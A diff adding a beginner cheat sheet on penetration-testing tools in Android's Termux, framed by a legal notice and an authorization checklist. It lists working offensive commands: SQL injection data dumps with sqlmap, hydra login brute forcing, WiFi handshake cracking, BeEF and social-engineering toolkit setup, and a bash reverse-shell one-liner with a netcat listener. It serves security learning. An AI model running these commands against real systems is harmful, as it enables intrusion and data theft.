@@ -1,0 +1,314 @@
+Ethical Hacking in Termux
+==========================
+
+IMPORTANT LEGAL NOTICE
+-----------------------
+Only use these tools on systems you OWN or have WRITTEN PERMISSION to test.
+Unauthorized access to systems is illegal in most countries and can result
+in criminal charges. This guide is strictly for:
+  - Learning on your own devices/networks
+  - Authorized penetration testing engagements
+  - CTF (Capture The Flag) competitions
+  - Security research in controlled lab environments
+
+
+========================================
+SETUP & ESSENTIAL TOOLS
+========================================
+
+Update Termux first:
+    pkg update && pkg upgrade
+
+Install core dependencies:
+    pkg install python python2 git curl wget nmap
+    pkg install openssh openssl net-tools
+    pkg install build-essential binutils
+
+
+========================================
+1. INFORMATION GATHERING
+========================================
+
+NMAP (Network Scanner)
+-----------------------
+    pkg install nmap
+
+    nmap <target-ip>                    # basic scan
+    nmap -sV <target-ip>               # service/version detection
+    nmap -sV -O <target-ip>            # OS detection
+    nmap -p 1-65535 <target-ip>        # scan all ports
+    nmap -A <target-ip>                # aggressive scan (OS, version, scripts)
+    nmap -sn 192.168.1.0/24            # ping sweep (find live hosts)
+    nmap --script vuln <target-ip>     # vulnerability scripts
+
+WHOIS LOOKUP
+-------------
+    pkg install whois
+    whois example.com
+
+DNS ENUMERATION
+----------------
+    pkg install dnsutils
+    nslookup example.com               # basic DNS lookup
+    dig example.com                    # detailed DNS info
+    dig example.com MX                 # mail server records
+    dig example.com ANY                # all records
+    host -t ns example.com             # name servers
+
+CURL FOR HTTP RECON
+--------------------
+    curl -I https://example.com        # HTTP headers only
+    curl -v https://example.com        # verbose (shows full handshake)
+    curl -L https://example.com        # follow redirects
+
+
+========================================
+2. WEB APPLICATION TESTING
+========================================
+
+INSTALL PYTHON TOOLS
+---------------------
+    pip install requests beautifulsoup4
+
+SQLMAP (SQL Injection Testing)
+-------------------------------
+    pkg install python git
+    git clone https://github.com/sqlmapproject/sqlmap.git
+    cd sqlmap
+    python3 sqlmap.py -u "http://target.com/page?id=1"
+    python3 sqlmap.py -u "http://target.com/page?id=1" --dbs    # list databases
+    python3 sqlmap.py -u "http://target.com/page?id=1" --dump   # dump data
+
+NIKTO (Web Server Scanner)
+---------------------------
+    pkg install perl
+    git clone https://github.com/sullo/nikto.git
+    cd nikto/program
+    perl nikto.pl -h http://target.com
+
+DIRB / DIRECTORY BRUTEFORCE (Python alternative)
+-------------------------------------------------
+    pip install dirsearch
+    python3 -m dirsearch -u http://target.com -e php,html,js
+
+SUBDOMAIN ENUMERATION
+----------------------
+    pip install sublist3r
+    python3 sublist3r.py -d example.com
+
+
+========================================
+3. PASSWORD TESTING
+========================================
+
+HYDRA (Login Brute Forcer)
+---------------------------
+    pkg install hydra
+
+    # SSH brute force:
+    hydra -l username -P wordlist.txt ssh://target-ip
+
+    # FTP brute force:
+    hydra -l admin -P wordlist.txt ftp://target-ip
+
+    # HTTP login form:
+    hydra -l admin -P wordlist.txt target.com http-post-form \
+      "/login:username=^USER^&password=^PASS^:Invalid"
+
+WORDLISTS
+----------
+    # Install SecLists (popular wordlist collection):
+    git clone https://github.com/danielmiessler/SecLists.git
+
+    # Common paths:
+    SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
+    SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+
+HASH CRACKING (Hashcat alternative for Android)
+-------------------------------------------------
+    pip install hashid                 # identify hash type
+    hashid '<hash-here>'
+
+    # John the Ripper:
+    pkg install john
+    john --wordlist=wordlist.txt hashfile.txt
+    john --show hashfile.txt           # show cracked passwords
+
+
+========================================
+4. NETWORK ANALYSIS
+========================================
+
+TCPDUMP (Packet Capture)
+-------------------------
+    pkg install tcpdump
+
+    tcpdump -i wlan0                   # capture on wifi interface
+    tcpdump -i wlan0 -w capture.pcap   # save to file
+    tcpdump -i wlan0 port 80           # capture HTTP traffic
+    tcpdump -i wlan0 host 192.168.1.1  # capture traffic to/from host
+
+    # View interfaces:
+    ip link show
+
+NETCAT (Swiss Army Knife)
+--------------------------
+    pkg install netcat-openbsd
+
+    nc -lvp 4444                       # listen on port 4444
+    nc target-ip 4444                  # connect to target
+    nc -zv target-ip 20-80             # port scan range
+
+METASPLOIT (Advanced Framework)
+---------------------------------
+    # Install via unofficial Termux script:
+    pkg install unstable-repo
+    pkg install metasploit
+
+    # Or manual install:
+    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
+    chmod +x msfinstall
+    ./msfinstall
+
+    msfconsole                         # start Metasploit
+
+
+========================================
+5. WIRELESS SECURITY TESTING
+========================================
+
+Note: Wireless packet injection requires a compatible WiFi adapter.
+Android's built-in WiFi chip usually doesn't support monitor mode.
+Use an external USB WiFi adapter (via OTG cable).
+
+    pkg install aircrack-ng
+
+    airmon-ng start wlan0              # enable monitor mode
+    airodump-ng wlan0mon               # scan for networks
+    airodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon
+    aircrack-ng -w wordlist.txt capture-01.cap
+
+
+========================================
+6. EXPLOITATION FRAMEWORKS & TOOLS
+========================================
+
+BEEF (Browser Exploitation Framework)
+--------------------------------------
+    pkg install nodejs
+    git clone https://github.com/beefproject/beef.git
+    cd beef
+    ./install
+    ./beef
+
+SOCIAL ENGINEERING TOOLKIT
+----------------------------
+    pkg install python git
+    git clone https://github.com/trustedsec/social-engineer-toolkit.git
+    cd social-engineer-toolkit
+    pip install -r requirements.txt
+    python3 setup.py
+
+REVERSE SHELL (for authorized testing)
+----------------------------------------
+    # Listener on your machine:
+    nc -lvp 4444
+
+    # On target (after authorized access):
+    bash -i >& /dev/tcp/your-ip/4444 0>&1
+
+
+========================================
+7. CTF TOOLS
+========================================
+
+    pip install pwntools             # CTF binary exploitation
+    pip install pycryptodome         # cryptography challenges
+    pkg install binutils             # binary analysis (strings, objdump)
+    pkg install gdb                  # debugger
+
+    # Steganography:
+    pkg install steghide
+    pkg install imagemagick
+
+    # Base64/encoding:
+    echo "text" | base64             # encode
+    echo "dGV4dA==" | base64 -d     # decode
+
+    # Hex dump:
+    xxd file.bin | head
+
+
+========================================
+8. REPORTING TOOLS
+========================================
+
+    pkg install vim                  # text editor for notes
+    pip install jinja2               # for report templates
+
+    # Keep organized notes:
+    mkdir pentest-report
+    cd pentest-report
+    touch scope.txt findings.txt remediation.txt
+
+
+========================================
+PRACTICE SAFELY (Legal Targets)
+========================================
+
+Online practice platforms (no setup needed):
+    - HackTheBox      -> https://hackthebox.com
+    - TryHackMe       -> https://tryhackme.com
+    - PicoCTF         -> https://picoctf.org
+    - VulnHub         -> https://vulnhub.com (download VMs)
+    - PortSwigger Web Security Academy -> https://portswigger.net/web-security
+
+Set up your own vulnerable lab:
+    - DVWA (Damn Vulnerable Web App)
+    - Metasploitable2
+    - OWASP WebGoat
+
+
+========================================
+ETHICAL HACKER CHECKLIST
+========================================
+
+Before any test:
+    [ ] Get WRITTEN authorization from the system owner
+    [ ] Define the scope (which IPs/domains are in scope)
+    [ ] Set rules of engagement (what tools are allowed)
+    [ ] Agree on testing window (time/date)
+
+During the test:
+    [ ] Stay within the defined scope
+    [ ] Document everything you find
+    [ ] Stop immediately if you find sensitive data unexpectedly
+    [ ] Do not modify/delete data
+
+After the test:
+    [ ] Write a clear report with findings and severity
+    [ ] Provide remediation recommendations
+    [ ] Verify fixes after they are applied
+
+
+========================================
+COMMON PORTS TO KNOW
+========================================
+
+    21   - FTP
+    22   - SSH
+    23   - Telnet
+    25   - SMTP (email)
+    53   - DNS
+    80   - HTTP
+    110  - POP3
+    143  - IMAP
+    443  - HTTPS
+    445  - SMB (Windows file sharing)
+    3306 - MySQL
+    3389 - RDP (Remote Desktop)
+    5432 - PostgreSQL
+    6379 - Redis
+    8080 - HTTP alternate
+    8443 - HTTPS alternate
+    27017- MongoDB
